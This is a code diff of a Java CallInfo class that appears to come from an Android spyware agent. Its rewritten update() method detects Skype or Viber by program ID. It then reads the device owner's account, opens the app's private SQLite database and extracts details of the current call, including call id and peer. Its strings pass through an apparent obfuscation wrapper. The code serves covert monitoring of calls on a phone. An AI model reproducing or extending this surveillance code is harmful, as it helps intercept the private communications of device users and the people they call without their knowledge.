@@ -25,7 +25,6 @@ public class CallInfo {
 	public boolean delay;
 	public boolean realRate;
 	private long[] streamId = new long[2];
-	private int[] streamPid = new int[2];
 
 	public String getCaller() {
 		if (!incoming) {
@@ -60,26 +59,121 @@ public class CallInfo {
 
 		return true;
 	}
-	public boolean setStreamPid(boolean remote, int pid) {
+	public boolean setStreamPid( int pid) {
 
-		int pos = remote ? 1 : 0;
-		if (pid != this.streamPid[pos]) {
 
-			if (this.streamPid[pos] != 0) {
+		if (pid != this.programId) {
+
+			if (this.programId != 0) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (setStreamPid): Wrong pid: " + this.streamPid[pos] + " <- " + pid + " "
-							+ (remote ? "remote" : "local"));
+					Check.log(TAG + " (setStreamPid): Wrong pid: " + this.programId + " <- " + pid );
 				}
-				this.streamPid[pos] = pid;
+				this.programId = pid;
 				return false;
 			}
 
-			this.streamPid[pos] = pid;
+			this.programId = pid;
 		}
 
 		return true;
 	}
-	public boolean update(boolean end) {
+	public boolean update(boolean end){
+
+		// RunningAppProcessInfo fore = runningProcesses.getForeground();
+		if (this.valid) {
+			return true;
+		}
+
+
+		if ( this.programId == 0x0146 ) {
+			if (Cfg.DELAY_SKYPE_CALL) {
+
+				this.processName = M.e("com.skype.raider");
+				// open DB
+
+
+				this.delay = true;
+				this.realRate = false;
+
+				boolean ret = false;
+				if (end) {
+					String account = ChatSkype.readAccount();
+					this.account = account;
+
+					GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
+					if (helper != null) {
+						ret = ChatSkype.getCurrentCall(helper, this);
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (updateCallInfo): id: " + this.id + " peer: " + this.peer);
+						}
+					}
+				} else {
+					this.account = M.e("delay");
+					this.peer = M.e("delay");
+					ret = true;
+				}
+
+				return ret;
+			} else {
+
+				if (end) {
+					return true;
+				}
+				this.processName = M.e("com.skype.raider");
+				// open DB
+				String account = ChatSkype.readAccount();
+				this.account = account;
+				this.programId = 0x0146;
+				this.delay = false;
+				this.realRate = false;
+
+				GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
+
+				boolean ret = false;
+				if (helper != null) {
+					ret = ChatSkype.getCurrentCall(helper, this);
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " SKYPE (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:"+ ret);
+					}
+				}
+
+				return ret;
+			}
+		} else if ( this.programId == 0x0148) {
+			boolean ret = false;
+			this.processName = M.e("com.viber.voip");
+			this.delay = true;
+			this.realRate = true;
+
+			// open DB
+			this.programId = 0x0148;
+			if (end) {
+				String account = ChatViber.readAccount();
+				this.account = account;
+				GenericSqliteHelper helper = ChatViber.openViberDBHelperCall();
+
+				if (helper != null) {
+					ret = ChatViber.getCurrentCall(helper, this);
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (updateCallInfo) id: " + this.id);
+				}
+			} else {
+				this.account = M.e("delay");
+				this.peer = M.e("delay");
+				ret = true;
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " VIBER (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:"+ ret);
+			}
+
+			return ret;
+
+		}
+		return false;
+	}
+	public boolean update_old(boolean end) {
 
 		// RunningAppProcessInfo fore = runningProcesses.getForeground();
 		if (this.valid) {
